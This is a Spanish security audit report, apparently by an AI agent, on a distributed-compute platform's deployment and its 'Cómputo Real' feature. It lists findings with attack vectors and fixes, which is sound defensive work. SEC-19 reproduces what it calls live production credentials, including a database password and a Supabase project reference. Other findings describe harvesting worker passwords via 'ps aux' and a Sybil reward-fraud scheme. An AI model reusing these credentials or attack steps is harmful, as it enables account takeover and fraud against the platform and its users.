- [ ] Configurar `uvicorn --workers N --proxy-headers` si hay proxy reverso (para que `get_remote_address` en rate limiting reciba la IP real del cliente, no la IP del proxy)
- [ ] Revisar configuración de logging: nivel WARNING en producción (ya implementado), verificar que no se loguean objetos de provider completos

### Frontend

- [ ] Confirmar que `VITE_API_URL` apunta al dominio de producción del backend (no a localhost)
- [ ] Ejecutar `npm audit` y resolver vulnerabilidades críticas/altas antes del despliegue
- [ ] Evaluar migración de JWT de `localStorage` a cookie HttpOnly (SEC-04) — recomendado antes de go-live si el perfil de riesgo es alto
- [ ] Verificar que el build de producción (`vite build`) no expone source maps accesibles públicamente

### Infraestructura

- [ ] Configurar WAF (Web Application Firewall) con reglas de rate limiting a nivel de infraestructura como capa adicional a la del backend
- [ ] Asegurar que las conexiones entre backend y Supabase usan TLS (verificar `sslmode=require` en `SUPABASE_DB_URL`)
- [ ] Configurar alertas de monitorización para errores 401 en volumen anómalo (detección de intentos de fuerza bruta)
- [ ] Establecer política de rotación de secrets (JWT_SECRET_KEY, SUPABASE_SERVICE_ROLE_KEY) cada 90 días como mínimo

---

## Handoff para DevOps

### Acciones bloqueantes pre-deploy (deben resolverse antes de ir a producción)

**1. Race condition en retiros (SEC-01) — CRÍTICO**
Implementar `UPDATE ... WHERE available_balance >= amount RETURNING *` en `wallet_queries.py`. Sin esto, usuarios pueden extraer más fondos de los que tienen con peticiones concurrentes. Es un bug de pérdida económica directa.

**2. Rate limiting en /auth/login y /auth/register (SEC-02) — CRÍTICO**
Añadir `slowapi` al proyecto. Sin rate limiting, la plataforma es vulnerable a fuerza bruta y credential stuffing desde el primer día de operación.

**3. Cuenta demo en producción (SEC-06) — ALTO**
Asegurarse de que `003_seed.sql` NUNCA se ejecuta en el entorno de producción. Las credenciales `demo@co-computing.io` / `demo1234` son públicas en el repositorio de GitHub. Cualquier persona puede autenticarse como esa cuenta si existe en producción.

**4. Validación de entropía del JWT secret (SEC-03) — CRÍTICO**
Añadir el validador de longitud mínima en `Settings` y documentar el proceso de generación del secret en el runbook de despliegue. Verificar que el secret en producción tiene al menos 32 caracteres de alta entropía.

### Acciones de alta prioridad post-deploy inmediato (primera semana)

**5. JWT en localStorage (SEC-04) — ALTO**
Planificar la migración a cookie HttpOnly. Estimar 1-2 días de trabajo backend+frontend.

**6. Cabeceras de seguridad (SEC-10) — MEDIO**
Añadir CSP, HSTS, Referrer-Policy y Permissions-Policy al middleware. Trabajo de menos de 4 horas.

**7. Actualizar python-jose (SEC-15) — BAJO urgencia, MEDIO impacto**
Migrar a PyJWT en el siguiente sprint. Sin bloqueos arquitectónicos.

### Variables de entorno requeridas en el servidor de producción

```
SUPABASE_URL=https://<project-ref>.supabase.co
SUPABASE_SERVICE_ROLE_KEY=<solo en secrets manager, nunca en repo>
SUPABASE_DB_URL=postgresql://postgres.<ref>:<pwd>@<host>:6543/postgres?sslmode=require
JWT_SECRET_KEY=<openssl rand -hex 32>
JWT_ALGORITHM=HS256
JWT_EXPIRE_DAYS=7
FRONTEND_URL=https://<dominio-produccion.co-computing.io>
ENVIRONMENT=production
```

Verificar que ninguna de estas variables aparece en los logs de CI/CD. Si la plataforma usa GitHub Actions, deben configurarse como `Secrets` de repositorio, no como variables de entorno en texto plano.

---

## Auditoría Feature Cómputo Real — 2026-06-07

**Auditor:** Security Agent  
**Versión auditada:** commit `4f593f3` (rama `main`)  
**Alcance:** Feature "Cómputo Real Distribuido" — `backend/app/routers/compute.py`, `backend/app/routers/work.py`, `backend/app/services/compute_service.py`, `backend/app/services/consensus_service.py`, `backend/app/db/queries/compute_queries.py`, `backend/app/worker/main.py`, `backend/app/worker/plugins/data_processing.py`, `backend/app/worker/run_workers.sh`, `migrations/004_compute.sql`

### Resumen de hallazgos de esta sección

| ID | Severidad | Titulo |
|----|-----------|--------|
| SEC-19 | CRITICO | Credenciales de produccion reales en `backend/.env` dentro del repositorio |
| SEC-20 | ALTO | Contrasena del worker expuesta en linea de comandos y en script de demo |
| SEC-21 | ALTO | Sin rate limiting en `POST /work/claim` — acaparamiento de chunks |
| SEC-22 | ALTO | Sin timeout de chunks asignados — chunks huerfanos permanentes |
| SEC-23 | ALTO | Sybil attack en consenso — proveedor con multiples cuentas se auto-valida |
| SEC-24 | ALTO | Race condition en pago de recompensas por chunk (`credit_reward`) |
| SEC-25 | MEDIO | CSV sin sanitizacion de encabezados llega al worker como nombres de columna |
| SEC-26 | MEDIO | DoS por creacion masiva de jobs y chunks sin limite por usuario |
| SEC-27 | MEDIO | Proveedor puede ver payload completo de chunks (datos del cliente) |
| SEC-28 | MEDIO | Sin validacion de `operation` en el payload del chunk |
| SEC-29 | MEDIO | Sin aislamiento del worker — plugin ejecuta en el mismo proceso sin sandbox |
| SEC-30 | BAJO | `max_chunks` sin limite en `ClaimRequest` permite reclamar 10 chunks por ciclo |
| SEC-31 | BAJO | `duration_ms` controlado por el proveedor — dato no confiable en metricas |
| SEC-32 | BAJO | RLS de tablas nuevas replica el patron de bypass total de la auditoria anterior |

---

### SEC-19 — Credenciales de produccion reales expuestas en `backend/.env`

**Severidad: CRITICO**  
**CWE:** CWE-312 (Cleartext Storage of Sensitive Information), CWE-798 (Use of Hard-coded Credentials)  
**Archivo:** `backend/.env` (presente en disco; el `.gitignore` lo excluye correctamente, pero el archivo existe con credenciales reales)

**Descripcion:**

El archivo `backend/.env` contiene credenciales activas de produccion:

- `SUPABASE_SERVICE_ROLE_KEY`: JWT de rol `service_role` del proyecto `tgziidtkkhxkmhdydwkg` (Supabase), activo hasta 2096. Con esta clave cualquier atacante tiene acceso completo de lectura y escritura a toda la base de datos, bypasseando RLS.
- `SUPABASE_DB_URL`: cadena de conexion PostgreSQL con usuario `postgres.tgziidtkkhxkmhdydwkg` y contrasena en texto plano `Valdeecanada1`, apuntando al pooler de produccion en `aws-0-eu-west-1`.
- `JWT_SECRET_KEY`: clave de 64 caracteres hexadecimales usada para firmar todos los JWT de la plataforma.

El `.gitignore` del repositorio excluye `.env` correctamente, por lo que este archivo no deberia estar trackeado por git. Sin embargo, su mera existencia en el repositorio local con contenido real representa un riesgo critico de filtracion si alguien accede a la maquina de desarrollo, si el archivo fue committado accidentalmente en algun momento (verificable con `git log --all -- backend/.env`) o si se incluye inadvertidamente en un artefacto de build o log.

**Vector de ataque:**

Un atacante con acceso a la maquina de desarrollo, al historial git, a logs de CI/CD o a un artefacto de build que incluya el `.env` obtiene acceso total a la base de datos y puede forjar tokens JWT validos para cualquier cuenta.

**Impacto:** Compromiso total de la plataforma: lectura y escritura sin restriccion en todos los datos, capacidad de suplantar cualquier usuario, acceso a saldos y transacciones.

**Mitigacion concreta:**

1. Rotar INMEDIATAMENTE en Supabase: regenerar la `service_role key` y cambiar la contrasena de la conexion directa `SUPABASE_DB_URL`. El `JWT_SECRET_KEY` actual puede mantenerse si se confirma que el `.env` nunca fue commiteado, pero es recomendable rotarlo tambien.
2. Verificar el historial git: `git log --all --full-history -- backend/.env` y `git log --all --full-history -- "**/.env"`. Si aparece algun commit, usar `git filter-repo` para eliminar el secreto del historial y forzar un push.
3. Nunca almacenar credenciales reales en archivos `.env` del repositorio local. Usar un gestor de secretos (1Password Secrets Automation, Vault, AWS Secrets Manager) o variables de entorno del sistema operativo.
4. Añadir un hook de pre-commit (p.ej. `gitleaks` o `detect-secrets`) que rechace commits con patrones de credenciales.

---

### SEC-20 — Contrasena del worker expuesta en linea de comandos y en script de demo

**Severidad: ALTO**  
**CWE:** CWE-214 (Invocation of Process Using Visible Sensitive Information)  
**Archivos:** `backend/app/worker/main.py` linea 166, `backend/app/worker/run_workers.sh` linea 14

**Descripcion:**

El CLI del worker acepta la contrasena mediante `--password` como argumento posicional:

```
python -m app.worker --api http://localhost:8000 --email X --password Y
```

Los argumentos de proceso son visibles en:
- `ps aux` o `/proc/<pid>/cmdline` en Linux — cualquier usuario del sistema puede leerlos.
- Logs de shell history (`~/.bash_history`, `~/.zsh_history`).
- Logs de herramientas de orquestacion (systemd, supervisord, Docker Compose) que registran el comando completo.

El script `run_workers.sh` ademas fija la contrasena con el valor por defecto `password123` hardcodeado en la variable `WORKER_PASSWORD`.

**Vector de ataque:**

Un usuario no privilegiado del mismo servidor ejecuta `ps aux | grep worker` y obtiene las credenciales de todos los workers activos. Con ellas puede autenticarse como proveedor y acaparar chunks o enviar resultados fraudulentos.

**Impacto:** Compromiso de las cuentas de worker. Un atacante puede reclamar chunks, entregar resultados incorrectos y cobrar recompensas fraudulentas.

**Mitigacion concreta:**

1. Leer la contrasena desde una variable de entorno en lugar de argumento CLI:
   ```python
   # En main() — eliminar --password como argumento
   import os
   password = os.environ.get("WORKER_PASSWORD")
   if not password:
       parser.error("Se requiere la variable de entorno WORKER_PASSWORD")
   ```
2. En `run_workers.sh`, nunca poner el valor por defecto `password123`. Exigir que `WORKER_PASSWORD` este definida en el entorno antes de ejecutar el script.
3. A largo plazo: reemplazar autenticacion por contrasena del worker por un token de API de larga duracion (`API_KEY`) generado por el sistema y almacenado en un gestor de secretos.

**Estado actual:** PENDIENTE — confirmado en codigo.

---

### SEC-21 — Sin rate limiting en `POST /work/claim` — acaparamiento de chunks

**Severidad: ALTO**  
**CWE:** CWE-400 (Uncontrolled Resource Consumption), CWE-306 (Missing Authentication for Critical Function)  
**Archivo:** `backend/app/routers/work.py` linea 21

**Descripcion:**

El endpoint `POST /work/claim` no tiene ninguna restriccion de tasa de peticiones por proveedor. Un proveedor malicioso puede llamar al endpoint en bucle cerrado con `max_chunks=10` (limite del modelo) acaparando sistematicamente todos los chunks disponibles. El modelo `ClaimRequest` acepta hasta 10 chunks por peticion, y no hay limite de frecuencia de peticiones ni cuota maxima de chunks asignados simultaneamente a un mismo proveedor.

**Vector de ataque:**

Un proveedor lanza 100 peticiones concurrentes a `POST /work/claim`. Aunque el claim atomico con `FOR UPDATE SKIP LOCKED` garantiza que no hay duplicados, un solo proveedor puede reclamar todos los chunks disponibles antes de que otros trabajadores lleguen a hacer polling, monopolizando el sistema y pudiendo luego no entregarlos (o entregar resultados maliciosos sin competencia para el consenso).

**Impacto:** Un proveedor con multiples conexiones paralelas puede acaparar todos los chunks de un job, eliminando la distribucion real del computo y comprometiendo el modelo de consenso (necesita un segundo proveedor distinto para validar).

**Mitigacion concreta:**

1. Aplicar rate limiting por `provider_id` autenticado (no por IP, ya que multiples workers legitimos podrian estar detras del mismo NAT) usando `slowapi`:
   ```python
   # work.py
   @router.post("/claim", response_model=ClaimResponse)
   @limiter.limit("30/minute", key_func=lambda request: str(request.state.provider_id))
   def claim_chunks(...):
   ```
2. Anadir una columna `max_concurrent_chunks` en la tabla `providers` o un limite global configurable (p.ej. maximo 20 chunks asignados a un proveedor al mismo tiempo), verificado en `claim_chunks_atomic`.
3. En la query SQL de claim, anadir la condicion:
   ```sql
   AND (SELECT COUNT(*) FROM chunks WHERE assigned_to = %(provider_id)s AND status = 'assigned') < %(max_concurrent)s
   ```

**Estado actual:** PENDIENTE — el Code Reviewer lo identifico, no hay mitigacion en codigo.

---

### SEC-22 — Sin timeout de chunks asignados — chunks huerfanos permanentes

**Severidad: ALTO**  
**CWE:** CWE-400 (Uncontrolled Resource Consumption), CWE-703 (Improper Check for Exceptional Conditions)  
**Archivo:** `backend/app/db/queries/compute_queries.py` linea 168

**Descripcion:**

Cuando un worker reclama un chunk (estado `assigned`) y luego falla (crash, perdida de red, desconexion), el chunk permanece en estado `assigned` indefinidamente. No existe ningun mecanismo que libere los chunks asignados tras un timeout.

La mitigacion parcial `MAX_CHUNK_ATTEMPTS=5` en `claim_chunks_atomic` solo previene que chunks con muchos intentos sigan recibiendo asignaciones, pero no libera chunks que estan actualmente en estado `assigned` sin ser procesados. El codigo del worker tiene logica de retry de claim pero no de liberacion activa de chunks asignados.

**Vector de ataque (pasivo — no requiere atacante):**

Un worker con 3 chunks asignados sufre un crash. Esos 3 chunks quedan en `assigned` sin que ningun otro worker pueda reclamarlos. Si el job tiene pocos chunks, puede quedar en `processing` para siempre sin progresar, resultando en un job "zombie" que nunca completa.

**Impacto:** Jobs que nunca terminan. Degradacion del servicio para los clientes. Chunks de datos de usuario atrapados sin procesar.

**Mitigacion concreta:**

Anadir una columna `assigned_at timestamptz` en la tabla `chunks` (o reusar `created_at` con cautela). Crear un job de mantenimiento (puede ser una funcion PostgreSQL invocada cada N minutos por un scheduled job de Supabase) que resetee a `pending` los chunks que llevan mas de X minutos en `assigned`:

```sql
-- Funcion de cleanup (ejecutar periodicamente, p.ej. cada 5 minutos)
UPDATE chunks
SET status = 'pending',
    assigned_to = NULL
WHERE status = 'assigned'
  AND assigned_at < NOW() - INTERVAL '10 minutes';
```

Alternativamente, implementarlo como endpoint interno `POST /internal/cleanup-stale-chunks` llamado por un cron externo o por el scheduler del propio backend.

**Estado actual:** PARCIALMENTE MITIGADO — `MAX_CHUNK_ATTEMPTS=5` evita loops infinitos de reintento pero no libera chunks actualmente atascados en `assigned`. El timeout real sigue pendiente.

---

### SEC-23 — Sybil attack en consenso — proveedor con multiples cuentas se auto-valida

**Severidad: ALTO**  
**CWE:** CWE-284 (Improper Access Control), CWE-345 (Insufficient Verification of Data Authenticity)  
**Archivo:** `backend/app/services/consensus_service.py` lineas 197-228

**Descripcion:**

El mecanismo de consenso requiere que 2 proveedores distintos entreguen el mismo resultado para que un chunk sea marcado como `done` y se pague la recompensa. Sin embargo, no existe ninguna verificacion de que los proveedores sean entidades distintas en el mundo real. Un atacante puede registrar 2 (o 3) cuentas de proveedor y operar todos los workers asociados, reclamando el mismo chunk con ambas cuentas y enviando resultados coordinados (posiblemente incorrectos). El sistema considerara que hay consenso y pagara a ambas cuentas.

La unica proteccion existente es la constraint `UNIQUE (chunk_id, provider_id)` en `chunk_results`, que impide que la misma cuenta entregue dos veces el mismo chunk. Pero con dos cuentas distintas bajo el mismo control, el atacante tiene acceso completo al proceso de validacion.

**Vector de ataque:**

1. El atacante registra `worker_a@example.com` y `worker_b@example.com`.
2. Ambos workers reclaman el mismo chunk (gracias a `replicas_needed=2`).
3. El atacante controla el resultado que envia cada worker — puede enviar resultados incorrectos que coincidan entre si.
4. El consenso valida el chunk y paga a ambas cuentas.
5. El cliente recibe un resultado incorrecto.

**Impacto:** Los clientes reciben resultados de computo incorrectos sin posibilidad de detectarlo. Los proveedores maliciosos cobran recompensas por trabajo invalido. El trust score no captura el fraude porque el consenso lo marca como valido.

**Mitigacion concreta:**

1. A corto plazo (MVP): limitar el numero de chunks activos que puede reclamar un mismo rango de IPs o una misma subnet en el mismo job. No es perfecto pero eleva el coste del ataque.
2. A medio plazo: implementar un sistema de identidad de worker ligero — al registrarse, el proveedor declara su hardware (CPU/GPU/RAM ya registrados); el sistema puede verificar que dos workers con el mismo hardware fingerprint no procesen el mismo chunk.
3. A largo plazo: Proof of Work o challenge-response para verificacion de identidad de worker antes de permitir claims. Requiere rediseno del protocolo.
4. Documentar explicitamente en el brief y en el sistema que el consenso actual NO protege contra Sybil attacks de primer nivel.

**Estado actual:** PENDIENTE — el Code Reviewer lo identifico. No hay ninguna mitigacion en codigo.

---

### SEC-24 — Race condition en pago de recompensas por chunk (`credit_reward`)

**Severidad: ALTO**  
**CWE:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)  
**Archivo:** `backend/app/services/wallet_service.py` lineas 106-125, `backend/app/services/consensus_service.py` lineas 215-218

**Descripcion:**

La funcion `_pay_and_update_trust` en `consensus_service.py` llama a `wallet_service.credit_reward` para cada proveedor que ha enviado un resultado valido. El patron de escritura en `credit_reward` hereda el mismo defecto identificado en SEC-01: `update_wallet_on_task_complete` lee el saldo actual, calcula el nuevo valor en Python y escribe con un UPDATE simple sin atomicidad garantizada.

En el caso de un job con muchos chunks que se validan simultaneamente (escenario realista con varios workers en paralelo), multiples llamadas concurrentes a `credit_reward` para el mismo `provider_id` pueden resultar en perdida de recompensas (si dos escrituras se superponen, una sobreescribe a la otra).

**Vector de ataque (escenario de perdida no intencional):**

Un proveedor valida 5 chunks en un intervalo de menos de 100ms. Las 5 llamadas a `credit_reward` leen el saldo inicial, calculan incrementos en paralelo y escriben. En lugar de acumular 5 x 0.10 CC = 0.50 CC, el saldo final puede ser solo 0.10 CC (la ultima escritura gana).

**Impacto:** Perdida economica para proveedores honestos. Inconsistencia entre el numero de chunks validados y el saldo real acreditado. Dificil de detectar sin reconciliacion manual.

**Mitigacion concreta:**

Usar una operacion atomica en SQL para el credito de recompensa, similar a la mitigacion de SEC-01:

```sql
UPDATE wallets
SET available_balance = available_balance + %s,
    total_earned      = total_earned + %s,
    updated_at        = now()
WHERE provider_id = %s
RETURNING *
```

Esta operacion es segura porque PostgreSQL serializa los UPDATEs sobre la misma fila mediante bloqueo de fila.

**Estado actual:** PENDIENTE — el mismo patron defectuoso identificado en SEC-01 se replica en el nuevo flujo de computo.

---

### SEC-25 — CSV sin sanitizacion de encabezados — nombres de columna controlados por el cliente

**Severidad: MEDIO**  
**CWE:** CWE-20 (Improper Input Validation)  
**Archivos:** `backend/app/services/compute_service.py` lineas 54-83, `backend/app/worker/plugins/data_processing.py` linea 53

**Descripcion:**

La funcion `split_csv` en `compute_service.py` extrae los encabezados del CSV del cliente sin ninguna sanitizacion:

```python
headers = [h.strip() for h in headers]
```

Estos encabezados se incluyen directamente en el payload del chunk (`"columns": headers`) y llegan al worker, donde se usan como nombres de schema en polars (`pl.DataFrame(data=rows, schema=columns, orient="row")`) y como claves del resultado devuelto al servidor.

**Vectores de riesgo:**

1. Un cliente sube un CSV con encabezados que contienen caracteres especiales (`\n`, `\t`, comillas, caracteres Unicode de control). Polars puede lanzar excepciones inesperadas que el worker captura como `{"error": "..."}` y envia de vuelta, exponiendo detalles del entorno del worker en la respuesta de la API.
2. Si en el futuro se usa el nombre de columna en una consulta SQL construida dinamicamente (ej. en un nuevo tipo de operacion), el encabezado sin sanitizar se convierte en un vector de inyeccion SQL.
3. Los nombres de columna llegaran al resultado final (`finalize_job`) y se almacenaran en `jobs.result` (JSONB). Si el frontend renderiza estas claves sin escapar, es un vector de XSS almacenado.

**Mitigacion concreta:**

Sanitizar encabezados en `split_csv` antes de usarlos:

```python
import re

def _sanitize_column_name(name: str) -> str:
    # Permitir solo alfanumericos, guion bajo y guion
    sanitized = re.sub(r'[^\w\-]', '_', name.strip(), flags=re.UNICODE)
    # Asegurar que no empieza por digito
    if sanitized and sanitized[0].isdigit():
        sanitized = f"col_{sanitized}"
    return sanitized[:64]  # limite de longitud

headers = [_sanitize_column_name(h) for h in headers]
```

Ademas, validar que el numero de columnas no supere un maximo razonable (p.ej. 200 columnas) para prevenir payloads excesivamente grandes.

**Estado actual:** PENDIENTE — el Code Reviewer lo identifico. Solo hay un `.strip()` basico.

---

### SEC-26 — DoS por creacion masiva de jobs y chunks sin limite por usuario

**Severidad: MEDIO**  
**CWE:** CWE-400 (Uncontrolled Resource Consumption), CWE-770 (Allocation of Resources Without Limits or Throttling)  
**Archivo:** `backend/app/routers/compute.py` lineas 36-118

**Descripcion:**

El endpoint `POST /jobs` no tiene:

1. Limite de jobs activos por usuario: un cliente puede crear N jobs simultaneamente, cada uno generando miles de chunks.
2. Limite de tamano de datos inline: el campo `params["data"]` acepta `list[list[Any]]` sin restriccion de tamano. Un cliente puede enviar 100 MB de datos JSON inline (el limite de 10 MB solo aplica al upload multipart/CSV, no al path JSON).
3. Rate limiting: sin `slowapi` ni limite de frecuencia en `POST /jobs`.

Con `CHUNK_SIZE = 500` filas y un CSV de 10 MB (el maximo permitido por el upload), un job puede generar hasta ~20.000 chunks para un CSV de datos densos. Multiplicado por N jobs concurrentes, la tabla `chunks` puede crecer a millones de filas rapidamente.

**Escenario de ataque:**

Un cliente autenticado envia 100 peticiones POST /jobs con `params["data"]` de 50.000 filas inline (sin pasar por el limite de 10 MB del CSV). El backend genera 100 * 100 = 10.000 chunks, satura la tabla y bloquea el sistema para todos los demas usuarios.

**Mitigacion concreta:**

1. Limitar el numero de jobs activos por cliente (p.ej. max 5 jobs en estado `processing`):
   ```python
   active_jobs = compute_queries.count_active_jobs_by_client(client_id)
   if active_jobs >= MAX_ACTIVE_JOBS_PER_CLIENT:
       raise HTTPException(status_code=429, detail="Limite de jobs activos alcanzado")
   ```
2. Limitar el tamano del body JSON en el path inline (anadir validacion en `JobCreateRequest`):
   ```python
   data: list[list[Any]] = Field(..., max_length=100_000)  # max 100k filas inline
   ```
3. Aplicar rate limiting con `slowapi` en `POST /jobs`: p.ej. `5/minute` por usuario autenticado.

**Estado actual:** PENDIENTE.

---

### SEC-27 — Proveedor puede ver el payload completo de chunks (datos del cliente)

**Severidad: MEDIO**  
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)  
**Archivos:** `backend/app/routers/work.py` lineas 32-43, `backend/app/db/queries/compute_queries.py` linea 213

**Descripcion:**

Cuando un worker llama a `POST /work/claim`, recibe el campo `payload` del chunk, que contiene las filas de datos del CSV del cliente (`{"rows": [[...]], "columns": [...], "operation": "...", "target_columns": [...]}`). Este es el comportamiento esperado para que el worker pueda procesar el computo.

Sin embargo, no existe ninguna restriccion sobre a que jobs puede acceder un proveedor. La query `claim_chunks_atomic` selecciona chunks de cualquier job en estado `pending`, sin filtrar por ningun criterio de autorizacion del proveedor respecto al cliente que subio los datos. El cliente no puede configurar que sus datos solo sean procesados por proveedores de un determinado trust score o ubicacion geografica.

Esto implica que los datos del CSV (que pueden ser datos sensibles del negocio del cliente: ventas, datos de empleados, metricas financieras) se exponen a cualquier proveedor autenticado en la plataforma.

**Impacto:** Los datos de los clientes son accesibles por cualquier proveedor activo. No hay mecanismo de consentimiento, cifrado de payload ni segmentacion de datos.

**Mitigacion concreta (segun nivel de proteccion deseado):**

1. Minima (MVP): documentar en los terminos de servicio que los datos subidos son procesados por proveedores de la red. Anadir un aviso en el UI antes de subir el CSV.
2. Media: filtrar proveedores elegibles para un job segun `trust_score >= umbral` definido por el cliente en los `params` del job. Anadir la condicion en `claim_chunks_atomic`.
3. Alta (no MVP): cifrar los payloads en reposo con una clave derivada por job, y entregar la clave de descifrado al worker junto con el chunk (TEE o mecanismo de key delivery). Requiere rediseno significativo.

**Estado actual:** ACEPTADO COMO RIESGO DE MVP segun `briefs/02-computo-real.md` (seccion "Fuera de alcance: Sandboxing/aislamiento de seguridad del worker — documenta el riesgo en seguridad"). Debe documentarse explicitamente en terminos de servicio.

---

### SEC-28 — Sin validacion de `operation` en el payload del chunk en el worker

**Severidad: MEDIO**  
**CWE:** CWE-20 (Improper Input Validation)  
**Archivo:** `backend/app/worker/plugins/data_processing.py` lineas 66-77

**Descripcion:**

El campo `operation` del payload del chunk llega al worker y se usa como selector de logica en `_process_with_polars` y `_process_stdlib`. Los valores aceptados de facto son `mean`, `sum`, `min`, `max`, `count`. Cualquier otro valor no se rechaza con un error, sino que silenciosamente cae en el `else` y ejecuta `mean`.

El problema no es la ejecucion de codigo arbitrario (no hay `eval` ni `exec`), sino que:
1. Un servidor API comprometido o un bug en `compute_service.py` podria entregar un `operation` inesperado al worker.
2. Si se extiende el sistema con nuevas operaciones que si tienen implicaciones de seguridad (ej. operaciones que acceden al sistema de archivos), un payload malicioso podria triggear la logica incorrecta.

En la validacion del lado servidor, `compute_service.py` no valida que `params["operation"]` sea uno de los valores permitidos antes de incluirlo en el payload del chunk.

**Mitigacion concreta:**

1. En el servidor, validar `operation` en `JobCreateRequest` o en `create_job_with_chunks`:
   ```python
   ALLOWED_OPERATIONS = {"mean", "sum", "min", "max", "count"}
   operation = params.get("operation", "mean")
   if operation not in ALLOWED_OPERATIONS:
       raise HTTPException(400, detail=f"Operacion no soportada: {operation}")
   ```
2. En el worker plugin, validar explicitamente y lanzar excepcion si la operacion no es conocida en lugar de silenciar con el default:
   ```python
   if operation not in ("mean", "sum", "min", "max", "count"):
       raise ValueError(f"Operacion no soportada: {operation}")
   ```

**Estado actual:** PENDIENTE.

---

### SEC-29 — Sin aislamiento del worker — plugin ejecuta en el mismo proceso sin sandbox

**Severidad: MEDIO**  
**CWE:** CWE-693 (Protection Mechanism Failure)  
**Archivos:** `backend/app/worker/main.py` (docstring lineas 13-16), `backend/app/worker/plugins/data_processing.py`

**Descripcion:**

El worker ejecuta el computo del chunk en el mismo proceso Python, sin ninguna forma de aislamiento (no hay subprocess, no hay Docker-in-Docker, no hay seccomp, no hay AppArmor). El propio `main.py` documenta este riesgo en su docstring:

> "SECURITY NOTE: The worker executes payloads from the server without sandboxing. [...] Do NOT run this worker against untrusted API endpoints in production without adding proper isolation."

Para el plugin actual `data_processing`, el riesgo de RCE es bajo porque el plugin:
- No usa `eval`, `exec` ni `subprocess`.
- Procesa unicamente datos tabulares (listas de listas de valores primitivos).
- Usa polars o stdlib `statistics`, sin deserializacion de objetos arbitrarios.

Sin embargo, el riesgo existe en dos vectores:

1. **Servidor comprometido:** si la API devuelve un payload de chunk manipulado, el plugin procesa datos del atacante. Polars tiene su propia superficie de vulnerabilidades (crashes, consumo de memoria excesivo con DataFrames patologicos).
2. **Futuros plugins:** el sistema de plugins (`WorkerPlugin`) esta disenado para extensibilidad. Un futuro plugin de transcripcion de audio o rendering que invoque herramientas externas (`ffmpeg`, `blender`) seria un vector de RCE si los datos del payload no se validan estrictamente antes de pasarlos como argumentos a subprocess.

**Impacto para MVP actual:** BAJO — el plugin actual no ejecuta codigo arbitrario. El riesgo es de crash o consumo de recursos por datos malformados.  
**Impacto futuro:** CRITICO si se anade cualquier plugin que invoque procesos externos sin sandboxing.

**Mitigacion concreta:**

1. Para el MVP: anadir limites de recursos en el worker (max filas por chunk, max columnas, max tamano de celda) que se verifican antes de pasar los datos a polars.
2. Para produccion: ejecutar cada worker en un contenedor Docker con perfil seccomp restrictivo (`--security-opt seccomp=profile.json`), sin acceso a red (excepto al endpoint de la API), con filesystem de solo lectura.
3. Documentar en el README del worker los requisitos de aislamiento para despliegue en produccion.

**Estado actual:** ACEPTADO COMO RIESGO DE MVP segun `briefs/02-computo-real.md`. El riesgo inmediato es bajo con el plugin actual. Requiere accion antes de anadir plugins que invoquen procesos externos.

---

### SEC-30 — `max_chunks` sin validacion critica — 10 chunks por ciclo sin freno adicional

**Severidad: BAJO**  
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)  
**Archivo:** `backend/app/models/compute.py` lineas 59-60

**Descripcion:**

`ClaimRequest` valida `max_chunks` en el rango `[1, 10]`. El limite de 10 es razonable para uso legitimo pero no esta vinculado a ninguna politica de negocio documentada. Sin rate limiting (SEC-21), un proveedor puede llamar 60 veces por minuto a `/work/claim` con `max_chunks=10`, reclamando hasta 600 chunks por minuto de un solo proveedor.

**Mitigacion:** El limite de 10 es correcto. La mitigacion real es SEC-21 (rate limiting en el endpoint). Una vez aplicado el rate limiting, este hallazgo queda residual.

**Estado actual:** PENDIENTE (dependiente de SEC-21).

---

### SEC-31 — `duration_ms` controlado por el proveedor — dato no confiable

**Severidad: BAJO**  
**CWE:** CWE-346 (Origin Validation Error)  
**Archivo:** `backend/app/models/compute.py` linea 71, `backend/app/db/queries/compute_queries.py` linea 316

**Descripcion:**

El campo `duration_ms` en `SubmitRequest` es reportado por el proveedor y se almacena sin modificacion en `chunk_results.duration_ms`. Si este campo se usa en el futuro para calcular el `response_time_score` del proveedor o para optimizar la asignacion de chunks, un proveedor malicioso puede reportar duraciones artificialmente bajas (1 ms) para mejorar su score sin haber procesado el trabajo en tiempo real.

La unica validacion existente es `gt=0` (mayor que cero).

**Mitigacion concreta:**

1. Anadir un limite superior razonable: `duration_ms: int = Field(..., gt=0, le=3_600_000)` (max 1 hora).
2. El backend puede calcular independientemente el tiempo de procesamiento aproximado como `submit_time - assigned_at` y usarlo para detectar anomalias (proveedores que reportan 1 ms pero el delta real es 10 segundos).
3. Marcar explicitamente en el modelo y en la documentacion que `duration_ms` es un dato auto-reportado no verificado.

**Estado actual:** PENDIENTE — mejora de calidad de datos, no un riesgo de seguridad inmediato.

---

### SEC-32 — RLS de tablas nuevas replica el patron de bypass total

**Severidad: BAJO**  
**CWE:** CWE-284 (Improper Access Control)  
**Archivo:** `migrations/004_compute.sql` lineas 199-229

**Descripcion:**

La migracion `004_compute.sql` activa RLS en las tres tablas nuevas (`jobs`, `chunks`, `chunk_results`) y define dos capas de politicas: una permisiva para `service_role` y otra para usuarios finales basada en `auth.uid()`. Sin embargo, como se documenta en el propio archivo SQL y en SEC-05 de la auditoria anterior, `auth.uid()` retorna `NULL` en sesiones del backend porque el JWT es HS256 propio y no pasa por Supabase Auth. Las politicas de usuario (`jobs_select_own`, `chunk_results_select_own`, etc.) no tienen efecto real en el MVP.

Ademas, la politica `chunks_select_job_owner` esta simplificada intencionalmente:
```sql
USING (auth.role() IN ('authenticated', 'service_role'));
```
Esto permitiria a cualquier usuario autenticado leer cualquier chunk directamente desde Supabase si se usase la anon key (aunque el backend no la expone).

**Impacto:** Replica exactamente el riesgo de SEC-05. La unica capa de control de acceso es el codigo FastAPI. Un bug en cualquier endpoint expone datos sin red de seguridad en la BD.

**Mitigacion:** Idem SEC-05 — planificar la migracion a Supabase Auth o a un mecanismo de `SET LOCAL app.current_provider_id` para que las politicas RLS tengan efecto real.

**Estado actual:** ACEPTADO COMO DEUDA TECNICA (documentado en la migracion). Consistente con el patron del MVP actual.

---

## Resumen Ejecutivo — Feature Cómputo Real

### Tabla de severidad consolidada (hallazgos nuevos)

| ID | Severidad | Titulo | Estado |
|----|-----------|--------|--------|
| SEC-19 | CRITICO | Credenciales de produccion en `backend/.env` | PENDIENTE |
| SEC-20 | ALTO | Contrasena del worker en CLI | PENDIENTE |
| SEC-21 | ALTO | Sin rate limiting en `/work/claim` | PENDIENTE |
| SEC-22 | ALTO | Sin timeout de chunks asignados | PARCIALMENTE MITIGADO |
